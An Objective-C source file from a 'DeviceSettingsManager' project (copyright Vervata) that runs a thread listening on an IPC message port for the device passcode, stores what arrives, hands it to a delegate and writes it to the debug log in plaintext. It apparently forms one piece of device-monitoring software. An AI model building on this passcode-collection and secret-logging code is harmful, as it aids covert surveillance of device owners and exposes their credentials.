//
//  DevicePasscodeController.m
//  DeviceSettingsManager
//
//  Created by Makara on 3/4/14.
//  Copyright (c) 2014 Vervata. All rights reserved.
//

#import "DevicePasscodeController.h"
#import "DefStd.h"
#import "DebugStatus.h"

@interface DevicePasscodeController (private)
- (void) threadMethod: (id) aThreadArg;
@end

@implementation DevicePasscodeController

@synthesize mControllerThread, mCallerThread, mControllerRunLoop, mPasscode, mDelegate, mSelector;

- (id) init {
    if ((self = [super init])) {
        mCallerThread = [NSThread currentThread];
    }
    return (self);
}

- (void) startMonitorPasscode {
    if (![self mControllerThread]) {
        [NSThread detachNewThreadSelector:@selector(threadMethod:) toTarget:self withObject:nil];
    }
}

- (void) stopMonitorPasscode {
    if ([self mControllerThread] && [self mControllerRunLoop]) {
        [[self mControllerThread] cancel];
        
        CFRunLoopRef rl = [[self mControllerRunLoop] getCFRunLoop];
        CFRunLoopStop(rl);
        
        [self setMControllerThread:nil];
        [self setMControllerRunLoop:nil];
    }
}

#pragma mark -
#pragma mark Message port delegate method
#pragma mark -

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
    DLog(@"PASSCODE data did receive from port %@", aRawData)
    if (aRawData) {
        NSString *passcode = [[NSString alloc] initWithData:aRawData encoding:NSUTF8StringEncoding];
        DLog(@"PASSCODE: %@", passcode)
        [self setMPasscode:passcode];
        [passcode release];
        
        [mDelegate performSelector:mSelector
                          onThread:mCallerThread
                        withObject:nil
                     waitUntilDone:NO];
    }
}

#pragma mark -
#pragma mark Thread method
#pragma mark -

- (void) threadMethod: (id) aThreadArg {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    @try {
        while (![[self mControllerThread] isCancelled]) {
            DLog(@"Monitoring passcode in thread ...");
            MessagePortIPCReader *readerMsgPort = [[MessagePortIPCReader alloc] initWithPortName:kPasscodeMessagePort
                                                                      withMessagePortIPCDelegate:self];
            [readerMsgPort start];
            [self setMControllerThread:[NSThread currentThread]];
            [self setMControllerRunLoop:[NSRunLoop currentRunLoop]];
            CFRunLoopRun();
            [readerMsgPort release];
        };
    }
    @catch (NSException *exception) {
        DLog(@"Passcoed monitor thread exception, %@", exception);
    }
    @finally {
        DLog(@"End monitoring passcode in thread ...");
    }
    [pool release];
}

#pragma mark -
#pragma mark Memory management method
#pragma mark -

- (void) dealloc {
    [self stopMonitorPasscode];
    [self setMPasscode:nil];
    [super dealloc];
}

@end
